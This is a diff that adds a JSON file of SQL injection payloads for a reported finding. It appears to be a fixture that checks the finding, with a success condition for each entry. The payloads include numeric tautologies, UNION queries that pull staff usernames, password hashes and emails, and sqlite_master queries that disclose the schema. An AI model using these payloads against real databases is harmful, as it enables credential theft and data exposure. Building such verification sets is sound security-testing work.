@@ -1,0 +1,84 @@
+{
+  "finding": "finding-b04",
+  "reported_payload": "0 OR 1=1",
+  "attacks": [
+    {
+      "id": "a01",
+      "payload": "0 OR 1=1",
+      "class": "boolean",
+      "reported": true,
+      "note": "Numeric tautology, no quote to escape.",
+      "success_when": "returns more than 1 row"
+    },
+    {
+      "id": "a02",
+      "payload": "1 OR 1=1",
+      "class": "boolean",
+      "note": "Tautology past a real id.",
+      "success_when": "returns more than 1 row"
+    },
+    {
+      "id": "a03",
+      "payload": "0 OR id>0",
+      "class": "boolean",
+      "note": "Column comparison always true.",
+      "success_when": "returns more than 1 row"
+    },
+    {
+      "id": "a04",
+      "payload": "-1 OR 1=1",
+      "class": "boolean",
+      "note": "Negative id then tautology.",
+      "success_when": "returns more than 1 row"
+    },
+    {
+      "id": "a05",
+      "payload": "99 OR 1=1",
+      "class": "boolean",
+      "note": "Out-of-range id then tautology.",
+      "success_when": "returns more than 1 row"
+    },
+    {
+      "id": "a06",
+      "payload": "0 UNION SELECT id, username, pw_hash, role FROM staff-- ",
+      "class": "union",
+      "note": "Read the staff table (4 cols).",
+      "success_when": "results contain a staff hash or email"
+    },
+    {
+      "id": "a07",
+      "payload": "0 UNION SELECT id, email, role, username FROM staff-- ",
+      "class": "union",
+      "note": "Staff emails.",
+      "success_when": "results contain a staff hash or email"
+    },
+    {
+      "id": "a08",
+      "payload": "-1 UNION SELECT id, pw_hash, username, role FROM staff-- ",
+      "class": "union",
+      "note": "Hash in the name position.",
+      "success_when": "results contain a staff hash or email"
+    },
+    {
+      "id": "a09",
+      "payload": "0 UNION SELECT 1, sql, 3, 4 FROM sqlite_master WHERE type='table'-- ",
+      "class": "schema-disclosure",
+      "note": "Dump table DDL.",
+      "success_when": "results contain table DDL or a schema name"
+    },
+    {
+      "id": "a10",
+      "payload": "0 UNION SELECT 1, name, 3, 4 FROM sqlite_master-- ",
+      "class": "schema-disclosure",
+      "note": "List schema object names.",
+      "success_when": "results contain table DDL or a schema name"
+    },
+    {
+      "id": "a11",
+      "payload": "0 UNION SELECT 1, sql, 3, 4 FROM sqlite_master WHERE name='staff'-- ",
+      "class": "schema-disclosure",
+      "note": "DDL of the staff table.",
+      "success_when": "results contain table DDL or a schema name"
+    }
+  ]
+}
